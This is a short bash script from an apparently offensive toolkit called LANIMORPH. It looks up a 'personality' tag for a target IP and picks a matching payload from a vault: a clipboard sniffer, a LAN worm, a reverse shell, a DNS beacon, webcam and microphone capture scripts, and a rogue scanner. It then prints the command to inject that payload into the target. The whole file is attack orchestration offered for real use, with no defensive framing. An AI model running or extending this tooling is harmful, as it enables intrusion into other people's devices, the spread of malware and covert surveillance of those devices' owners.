#!/usr/bin/env bash
# LANIMORPH :: Personality Payload Selector (Real Mode)

TAG_LOG="$HOME/LANIMORPH/logs/personality_tags.log"
VAULT_DIR="$HOME/LANIMORPH/vault"

declare -A selector
selector["Leech"]="clip_sniff.py"
selector["Scout"]="lan_worm.py"
selector["Parasite"]="rev_shell.sh"
selector["Observer"]="fingerprint_dump.py"
selector["Ghost"]="dns_beacon.sh"
selector["Watcher"]="cam_snap_grab.py"
selector["Gremlin"]="mic_drop_termux.sh"
selector["Crawler"]="lanimals_roguescan.py"

# Validate input
IP="$1"
[[ -z "$IP" ]] && { echo "[!] Usage: $0 <target_ip>"; exit 1; }

# Extract personality
PERSONALITY=$(grep -w "$IP" "$TAG_LOG" | awk '{print $3}' | head -n1)
[[ -z "$PERSONALITY" ]] && { echo "[!] No personality tag found for $IP"; exit 1; }

# Select payload
PAYLOAD="${selector[$PERSONALITY]}"
[[ -z "$PAYLOAD" ]] && { echo "[!] No payload mapped for personality: $PERSONALITY"; exit 1; }

# Check payload file
PAYLOAD_PATH="$VAULT_DIR/$PAYLOAD"
[[ ! -f "$PAYLOAD_PATH" ]] && { echo "[!] Payload file not found: $PAYLOAD_PATH"; exit 1; }

# Output decision
echo "🎯 Target IP:        $IP"
echo "🧠 Personality:      $PERSONALITY"
echo "📦 Selected Payload: $PAYLOAD"
echo "📁 Payload Path:     $PAYLOAD_PATH"

# Next step suggestion
echo -e "\n[→] Inject with:\n   bash ~/LANIMORPH/chain/inject_family_runner.sh $PERSONALITY $IP"
